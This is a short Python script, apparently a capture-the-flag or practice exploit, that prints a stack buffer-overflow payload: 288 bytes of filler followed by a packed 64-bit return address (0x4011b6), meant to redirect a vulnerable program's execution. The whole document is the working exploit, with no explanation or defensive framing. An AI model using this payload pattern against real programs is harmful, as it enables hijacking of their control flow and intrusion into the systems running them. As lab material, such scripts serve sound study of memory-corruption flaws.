import sys

payload = b"AAAAAAAABBBBBBBB"*18
payload += b"\xb6\x11\x40\x00\x00\x00\x00\x00"

sys.stdout.buffer.write(payload)
